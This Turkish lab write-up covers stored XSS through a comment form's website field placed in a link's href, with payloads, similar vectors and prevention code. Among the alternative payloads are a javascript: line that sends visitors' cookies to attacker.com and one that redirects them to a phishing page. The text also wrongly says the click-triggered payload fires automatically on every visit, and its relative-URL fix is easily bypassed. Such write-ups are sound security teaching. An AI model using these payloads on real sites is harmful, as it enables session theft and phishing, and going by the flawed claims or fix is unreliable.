# Stored XSS into anchor href attribute with double quotes HTML-encoded

## Lab Açıklaması
Bu laboratuvarda, yorum kısmında depolanan (Stored) XSS zafiyetini inceliyoruz. Çift tırnak (`"`) HTML-encoded olmasına rağmen, `href` attribute'ine `javascript:` protokolü enjekte ederek saldırı gerçekleştirilir.

---

## Analiz

### Uygulama Davranışı
- Sitenin yorum (comment) kısmında kullanıcı adı renkli bir link olarak gösterilir.
- Yorumun yanında bir "Website" alanı bulunur.
- Kullanıcı adına tıklandığında, Website alanına yazılan URL açılır.
- Bu URL, kullanıcı adının `href` attribute'inde saklanır.

### Kaynak Kod (Tahmini)
```html
<!-- Yorum kısmında depolanan veri -->
<a href="https://www.google.com">USERNAME</a>
```

### Zafiyet Noktası
- Website alanı (URL) `href` attribute'ine doğrudan yazılıyor.
- Çift tırnak (`"`) HTML-encoded olsa da (olmaması durumunda), `javascript:` protokolü kabul edilir.
- Depolanan veri her ziyarette tetiklenir (Stored XSS).
- Validasyon yapılmıyor; herhangi bir protokol (http, https, javascript, data vb.) yazılabilir.

---

## İstismar

### Saldırı Stratejisi
1. Yorum yap ve kullanıcı adı belirle.
2. Website alanına `javascript:alert(1)` yaz.
3. Yorum gönder (Comment post).
4. Yorum sayfasına döndüğünde, kullanıcı adı linkine tıklanırsa payload çalışır.
5. Stored XSS olduğu için her ziyarette otomatik tetiklenir.

### Payload

```
javascript:alert(1)
```

#### Payload Açıklaması
- `href` attribute'i `javascript:` protokolünü kabul ediyor.
- Link tıklandığında tarayıcı `javascript:alert(1)` kodunu çalıştırıyor.
- Depolanan veri olduğundan, site her yüklenişinde tetiklenir.

#### Sonuç HTML
```html
<a href="javascript:alert(1)">USERNAME</a>
```

### Saldırı Adımları
1. Sitenin yorum kısmında yorum yap.
2. Kullanıcı adını belirle (örn: "Erdem").
3. Website alanına `javascript:alert(1)` yaz.
4. Comment butonuna tıkla.
5. Sayfa yüklendikten sonra, saldırganın kullanıcı adı linkine tıkla.
6. **Pop-up** görüntülenir.

#### Alternatif Payload'lar
```javascript
javascript:alert('XSS')
javascript:fetch('http://attacker.com/steal?cookie='+document.cookie)
javascript:window.location='http://attacker.com/phishing'
```

---

## Sonuç

✅ **Lab Başarıyla Tamamlandı**

Payload başarıyla çalışır ve **alert popup** görüntülenir. Bu, `href` attribute'ine `javascript:` protokolü enjeksiyonunun mümkün olduğunu ve zafiyetin depolanan (Stored) bir XSS olduğunu gösterir.

---

## Zafiyet Özeti

| Unsur | Değer |
|-------|-------|
| **Zafiyet Türü** | Stored XSS (Persistent) |
| **Kaynak (Source)** | Website form alanı (user input) |
| **Sink** | HTML `<a href="">` attribute |
| **Depolama Yeri** | Veritabanı / Sunucu |
| **Trigger Yöntemi** | Link tıklaması |
| **Payload** | `javascript:alert(1)` |
| **Etki Alanı** | Tüm site ziyaretçileri |

---

## Stored XSS vs Reflected XSS

### Reflected XSS
- Payload URL'de gönderilir.
- Sunucu payload'ı response'da yansıtır.
- Ziyaretçi özel link'i açana kadar hiçbir şey olmaz.
- Örnek: `https://site.com/search?q=<img src=x onerror=alert(1)>`

### Stored XSS (Bu Lab)
- Payload veritabanında depolanır.
- Sayfa her yüklenişinde payload tetiklenir.
- Saldırganın müdahalesi gerekmez.
- **Daha tehlikeli** - tüm ziyaretçileri etkiler.

---

## Benzer Saldırı Vektörleri

```html
<!-- Protokol-tabanlı payload'lar -->
<a href="javascript:alert('XSS')">Link</a>
<a href="data:text/html,<script>alert(1)</script>">Link</a>

<!-- Öznitelik kaçması (Bu lab'da uygulanmaz - tırnak encode edilmiş) -->
<a href=javascript:alert(1)>Link</a>

<!-- Event handler'lar (farklı context) -->
<a href="#" onclick="alert(1)">Link</a>
```

---

## Önleme Önerileri

### 1. URL Protokolünü Whitelist ile Doğrulama
```javascript
function isSafeUrl(url) {
    const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
    try {
        const urlObj = new URL(url, window.location.origin);
        return allowedProtocols.includes(urlObj.protocol);
    } catch (e) {
        return false;
    }
}

// Kullanım
if (isSafeUrl(userWebsite)) {
    link.href = userWebsite;
} else {
    link.href = '#'; // Güvenli fallback
}
```

### 2. URL Validasyonu (Server-side)
```javascript
// Node.js / Express örneği
function validateUrl(url) {
    try {
        const parsedUrl = new URL(url);
        // Sadece http ve https protokollerine izin ver
        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
            return null;
        }
        return url;
    } catch (e) {
        return null;
    }
}
```

### 3. Relative URL Kullanma
```javascript
// Sadece relative URL'lere izin ver
if (!userUrl.startsWith('http') && !userUrl.startsWith('javascript')) {
    link.href = '/' + userUrl;
}
```

### 4. Encode Etme (Eksik)
```html
<!-- ❌ Yeterli değil - javascript: hala çalışır -->
<a href="&quot;javascript:alert(1)&quot;">Link</a>

<!-- Çift tırnak encode edilmiş ama javascript: hala tehlikeli -->
```

### 5. Content Security Policy (CSP)
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; 
               object-src 'none'; base-uri 'self'">
```

### 6. JavaScript Protokolünü Engelleme (CSS)
```css
/* CSS'de javascript: protokolünü engellemek mümkün değil -->
/* JavaScript ile yapılmalı */
```

### 7. OWASP Validator Kullanma
```javascript
// OWASP Validator kütüphanesi
const validator = require('validator');

if (validator.isURL(userWebsite, { 
    protocols: ['http', 'https'],
    require_protocol: true 
})) {
    link.href = userWebsite;
}
```

### 8. Input Sanitization (Backend)
```php
<?php
// PHP örneği
function sanitizeUrl($url) {
    // URL'yi doğrula
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        return '';
    }
    
    // Protokolü kontrol et
    $parsed = parse_url($url);
    if (!in_array($parsed['scheme'], ['http', 'https'])) {
        return '';
    }
    
    return $url;
}
?>
```

---

## Genel Güvenlik Önerileri

1. **`javascript:` Protokolünü Engelle**: href, src, data attribute'larında kontrol et.
2. **Server-side Validasyon**: Client-side validation'a güvenme.
3. **Whitelist Yaklaşımı**: Sadece bilinen güvenli protokollere izin ver.
4. **Input Sanitization**: Tüm user input'larını sanitize et.
5. **Content Security Policy**: CSP header'ları ekle.
6. **Regular Security Audits**: Zafiyetleri düzenli olarak taraştır.
7. **User Education**: Şüpheli linkler hakkında kullanıcıları uyar.
8. **Logging & Monitoring**: Anomali tespiti için log'ları izle.

---

## Impact

**Kritik Risk** 🔴
- Tüm site ziyaretçileri etkilenir.
- Depolanan XSS (Persistent), her yükleme sırasında çalışır.
- Saldırganın müdahalesi gerekmez.
- Credential theft, phishing, malware dağıtımı mümkün.
